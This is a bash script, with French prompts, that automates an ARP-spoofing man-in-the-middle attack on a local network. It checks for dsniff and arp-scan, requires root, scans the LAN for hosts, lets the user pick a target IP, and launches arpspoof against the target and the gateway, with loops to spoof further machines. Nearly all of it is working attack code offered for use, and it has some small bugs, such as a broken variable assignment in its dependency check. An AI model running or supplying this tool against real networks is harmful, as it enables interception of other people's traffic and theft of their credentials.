#!/bin/bash

function liste() {
sudo arp-scan --interface=$interface --localnet > listeip.txt
nb=$(grep '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' listeip.txt | grep -v $(route -n | tail +3 | head -n1 | awk '{print $2 }') | grep -v $(hostname -I | cut -d " " -f 1) | wc -l )
echo "$nb Machines dans le réseau: " 

grep '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' listeip.txt | grep -v $(route -n | tail +3 | head -n1 | awk '{print $2 }') | grep -v $(hostname -I | cut -d " " -f 1)


for var in $(grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' listeip.txt | grep -v $(route -n | tail +3 | head -n1 | awk '{print $2 }') | grep -v $(hostname -I | cut -d " " -f 1) )
do
        tab[i]=$var
        ((i++))
done

}

function spoof() {
echo "Entrez IP: "
read ip

existe=0

for iptab in ${tab[@]}
do
        if [[ $ip == $iptab ]]
        then
                existe=1
        fi
done

while [[ $existe -ne 1 ]]
do
        echo "La machine n'existe pas ou n'est pas valide entrez une nouvelle IP : "
        read ip
        for iptab in ${tab[@]}
        do
                if [[ $ip == $iptab ]]
                then
                        existe=1
                fi
        done
 done

echo "Lancement Interface Xterm "
xterm -e "arpspoof -i $interface -t $ip  -r $(route -n | tail +3 | head -n1 | awk '{print $2}') ; $SHELL" &
}

function verif(){

check=1

dsniff=$(dpkg-query -W -f='${Status}' dsniff 2>/dev/null)
arpscan=$(dpkg-query -W -f='${Status}' arp-scan 2>/dev/null)
xterm=$(dpkg-query -W -f='${Status}' xterm 2>/dev/null)

if [[ $dsniff != *"ok"* ]]
then
        $check = 0
        echo "Install dsniff"
fi
if [[ $arpscan != *"ok"* ]]
then
        $check = 0
        echo "Install arpscan"
fi

if [[ $xterm != *"ok"* ]]
then
        $check = 0
        echo "Install xterm"
fi

}

verif
if [[ $check == 1 ]]
then
root=$(whoami)

if [[ $root != "root" ]]
	then
		echo "Need to be root "
else
routage=$(cat /proc/sys/net/ipv4/ip_forward )
echo " "
echo "Routage des paquets: $routage"
echo Adresse Local: $(hostname -I | cut -d " " -f 1)
echo Adresse Router: $(route -n | tail +3 | head -n1 | awk '{print $2 }')
echo "Liste interfaces:"
echo " "


tab=[]
element=$(ifconfig | grep "RUNNING" | cut -d " " -f 1 | cut -d ":" -f 1)
i=0
for var in $element
do
        tab[$i]=$var
	echo "$i : $var"
	((i++))
done


echo " "
echo "Entrez le numéro de l' interface (0-$(($i-1)))":
read id

while (( $id < 0 || $id > $(($i-1)) ))
	do
		echo Entrez un numéro valide interface:
		read id
	done


interface=${tab[$(($id))]}
echo Choice : $interface
liste

echo "Voulez vous re-scanner ? OUI - NON "
read choix

while [[ $choix == "OUI" || $choix == "oui" ]]
do
	liste
	echo "Voulez vous re-scanner ? OUI - NON "
	read choix
done
spoof


echo "Voulez-vous spoofer une  autre machine ? OUI - NON "
read rep
while [[ $rep == "OUI" || $rep == "oui" ]]
do
	liste
	spoof
	echo "Voulez-vous spoofer une  autre machine ? OUI - NON "
	read rep

done
fi
fi
